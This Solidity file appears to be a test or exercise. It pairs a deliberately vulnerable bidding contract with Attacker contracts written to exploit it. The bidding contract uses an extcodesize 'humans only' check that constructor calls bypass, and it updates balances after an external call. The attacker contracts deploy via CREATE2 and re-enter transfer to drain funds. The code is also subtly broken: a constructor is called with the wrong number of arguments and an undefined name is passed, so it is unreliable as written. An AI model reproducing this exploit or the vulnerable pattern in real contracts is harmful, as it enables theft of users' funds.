pragma solidity ^0.8.0;

// SPDX-License-Identifier: GPL-3.0
contract C {
    mapping (address => uint256) private bids;
    uint highestBid;
    address highestBidder;

    modifier isHuman() {
        address _addr = msg.sender;
        uint256 _codeLength;
        assembly {_codeLength := extcodesize(_addr)}
        require(_codeLength == 0, "sorry humans only");
        _;
    }

    function bid() public payable isHuman() {
        require(msg.value > 0, "no zero value");
        require(msg.value > highestBid, "no lowballing");
        highestBid = msg.value;
        highestBidder = msg.sender;
        bids[msg.sender] += msg.value;       
    }

    function transfer(address to) isHuman() public {
        uint256 amt = bids[msg.sender];
        require(amt > 0, "Insufficient funds");
        (bool success, ) = to.call{value:amt}("");
        require(success, "Call failed");
        bids[msg.sender] = 0;    // side effect after call
    }

}

contract Attacker {
    bool public deposited;
    bytes initCode;
    uint counter;

    function attack() public {
        // new Attacker2 with salt here
        if (counter < 5) {
            uint salt = 8746532;
            counter++;
            new Attacker2{salt: bytes32(salt), value: 1 ether}(deposited);
        }
    }

    function setDeposited(bool _deposited) public {
        deposited = _deposited;
    }

    function setCoounter(uint _counter) public {
        counter = _counter;
    }

    receive() payable external {
    }
}

contract Attacker2 {
    address victim = 0xCAfEcAfeCAfECaFeCaFecaFecaFECafECafeCaFe;
    address attacker; // = 0xbABEBABEBabeBAbEBaBeBabeBABEBabEBAbeBAbe;

    constructor(address _attacker, bool deposited) payable {
        attacker = _attacker;
        if(deposited) {
            C(victim).transfer(attacker);
        } else {
            C(victim).bid{value: msg.value}();
            Attacker(payable(attacker)).setDeposited(true);
            C(victim).transfer(attacker);
        }

    }

    receive() payable external {
        payable(attacker).transfer(msg.value);
        Attacker(payable(attacker)).attack();
        C(victim).transfer(attack);
    }
}